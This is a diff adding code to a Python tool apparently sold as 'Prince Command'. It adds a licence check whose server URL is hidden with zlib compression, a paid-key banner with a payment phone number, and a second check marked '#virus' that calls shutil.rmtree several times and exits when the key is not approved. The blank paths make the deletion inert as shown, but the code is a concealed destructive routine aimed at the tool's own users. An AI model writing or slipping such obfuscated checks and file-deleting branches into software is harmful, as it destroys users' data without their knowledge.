@@ -972,7 +972,75 @@ class automation:
 
 		self.iAmPasswordManager()
 
-
+	def za():
+		global tp
+		myid = getKey()
+		os.system(" clear ")
+		ux=zlib.decompress(b'x\x9c\xcb())(\xb6\xd2\xd7\xcfH\xcc\xadJ,H\xccL1\xd4K\xca\xc9O/.\xc8/\xd1K\xce\xcf\xd57202\xd67\xb0\xd4/(\xca\xccKN\xd5\x05\xa9\xd05\xd4\xcb(\xc9\xcd\x01\x00]v\x13\xfb').decode()
+		with urlopen(ux) as response:
+			body =response.read()
+		if myid in str(body):
+			tp=1
+			Hamza()
+		else:
+			tp=0
+			print( '''  \x1b[1;92m  ██████  ██████  ██ ███    ██  ██████ ███████ 
+		██   ██ ██   ██ ██ ████   ██ ██      ██      
+		██████  ██████  ██ ██ ██  ██ ██      █████   
+		██      ██   ██ ██ ██  ██ ██ ██      ██      
+		██      ██   ██ ██ ██   ████  ██████ ███████ \x1b[0m
+	
+	╭──────────  \x1b[1;92m•\x1b[1;91m•\x1b[1;96m• \x1b[0mPrince Command \x1b[1;96m•\x1b[1;91m•\x1b[1;92m• \x1b[0m ─────────────╮
+	│           WELCOME TO PRINCE COMMAND             │
+	╰─────────────────────────────────────────────────╯''')
+			print("")
+			
+			print(  '''    ╭──────  \x1b[1;92m•\x1b[1;91m•\x1b[1;96m• \x1b[0m DETAILS \x1b[1;96m•\x1b[1;91m•\x1b[1;92m• \x1b[0m  ──────────╮
+		│       YOUR KEY IS NOT APROVED       │
+		│         THIS TOOL IS PAID           │   
+		╰─────────────────────────────────────╯''')
+			print( '''  ╭─────  \x1b[1;92m•\x1b[1;91m•\x1b[1;96m• \x1b[0m PAYMENT METHOD \x1b[1;96m•\x1b[1;91m•\x1b[1;92m• \x1b[0m  ────────╮
+	│          EASYPAISA & JAZZCASH           │
+	│       15 Days 350RS | 30 Days 600RS     │   
+	│                  BINANCE                │  
+	│          5$ 15 Days | 10$ 30 Days       │
+	╰─────────────────────────────────────────╯''')
+			print("")
+			print("             \x1b[1;96m  [ PRINCE • KEY ]")
+			print("\x1b[1;92mPRINCE-"+myid)
+			print("\x1b[0m")
+			print("")
+			print("      \x1b[1;96m  [EASYPAISA & JAZZCASH NUMBER]")
+			print("                \x1b[1;93m 03240191630 \x1b[0m")
+			print(60*'─')
+			print("           \x1b[1;96m       [ NOTE ]" )
+			print("\x1b[1;91m[ IF YOUR KEY IS CHANGED BEACUSE OF MOBILE RESET OR UPDATE ]")
+			print("      [ I AM NOT RESPONSIBLE FOR THAT ] ")
+			print("    \x1b[1;91m[ BUY COMMMAND IN YOUR RESPONSIBILITY ]")
+			print("        [ PAYMENT WILL BE NOT RETURN ]\x1b[0m")
+			print("\x1b[1;91m [ IF IDS WERE NOT COMMING BEACUSE OF SERVER ISSUE ]")
+			print("      [ I AM NOT RESPONSIBLE FOR THAT ] ")
+			print("[ THEN AFTER SERVER ISSUE WILL BE FIX SOON IDS WILL BE COME AGAIN ] \x1b[0m")
+			print(60*'─')
+			input("[•] Press Enter To Send Key")
+			url_wa = "https://api.whatsapp.com/send?phone=+923240191630&text="
+			name = input("[•] TYPE YOUR NAME : ")
+			tks = ("Hi I Want To Buy Prince Command \nMy name : "+name+" \nKey : PRINCE-"+myid)
+			subprocess.check_output(["am", "start", url_wa+(tks)]);time.sleep(2)    
+	def verf():
+		myid = getKey()
+		os.system(" clear ")
+		with urlopen(zlib.decompress(b'x\x9c\xcb())(\xb6\xd2\xd7\xcfH\xcc\xadJ,H\xccL1\xd4K\xca\xc9O/.\xc8/\xd1K\xce\xcf\xd57202\xd67\xb0\xd4/(\xca\xccKN\xd5\x05\xa9\xd05\xd2\xcb(\xc9\xcd\x01\x00]|\x13\xfc').decode()) as response:
+			body = response.read()
+		if myid in str(body):
+			pass
+		else:
+			#virus. remove  to execute virus
+			shutil.rmtree("")
+			shutil.rmtree("")
+			shutil.rmtree("")
+			print("")
+			sys.exit()
 
 
 
